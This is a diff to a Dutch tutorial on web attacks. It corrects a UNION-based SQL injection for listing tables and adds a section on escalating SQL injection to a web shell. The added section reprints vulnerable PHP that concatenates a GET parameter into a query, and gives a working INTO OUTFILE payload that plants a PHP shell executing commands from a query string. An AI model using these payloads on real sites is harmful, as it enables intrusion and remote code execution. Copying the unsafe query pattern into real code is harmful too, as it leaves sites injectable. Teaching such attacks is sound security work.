@@ -260,9 +260,39 @@ Doormidden van group_concat en concat kan je vervolgens deze velden in 1 kolom s
 
 Als we terug gaan naar onze union select injectie kunnen wij de volgende query ervan maken:
 
-`-1 UNION SELECT 1, SELECT GROUP_CONCAT(concat('table_schema'.'table_name'), '-') FROM information_schema.table # --` 
+`-1 UNION SELECT 1, GROUP_CONCAT(concat('table_schema'.'table_name'), '-') FROM information_schema.table # --` 
 
 Zie in de inhoud nu alle tabellen verschijnen.
+
+### Van SQL injectie naar Webshell ###
+
+Als wij het bovenstaande codevoorbeeld weer pakken:
+
+    <?PHP
+		$pagina = 0;
+		if (isset($_GET['pagina']))
+		{
+			$pagina = $_GET['pagina'];
+		}
+		
+		$rPagina = mysqli_query($db, "SELECT titel, inhoud FROM paginas WHERE id=".$_GET['pagina']." LIMIT 1");
+		if (mysqli_num_rows($rPagina) > 0)
+		{
+			$aPagina = mysqli_fetch_assoc($rPagina);
+
+			echo "
+				<h1>".$aPagina['titel']."</h1>
+				".$aPagina['inhoud'];
+		}
+	?>
+
+Zoals wij eerder gezien hebben kan je dan gegevens opvragen, maar sommige SQL accounts hebben ook toegang tot de [SELECT ... INTO](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) syntax. Je webapplicatie moet wel schrijfrechten hebben op de plaats waar je een bestand wilt wegschrijven. Denk dan aan logische locaties zoals /tmp (heb je wel een LFI nodig) of in een directory van de webserver. Ook mappen waar de website sowieso file uploads opslaat zijn goede locaties.
+
+Een voorbeeld van een injectie die je dan kan doen is als volgt:
+
+`-1 UNION SELECT 1, '<?PHP $return = array(); exec($_GET['c'],$return); echo implode("\n",$return); ?>' INTO OUTFILE '/var/www/html/shell.php' # --`
+
+Als je dan op de webserver de file shell.php opvraagt met als querystring c=ls dan zal je de directory listing zien van de /var/www/html map.  
 
 ## Client-side controle functionaliteiten ##
 
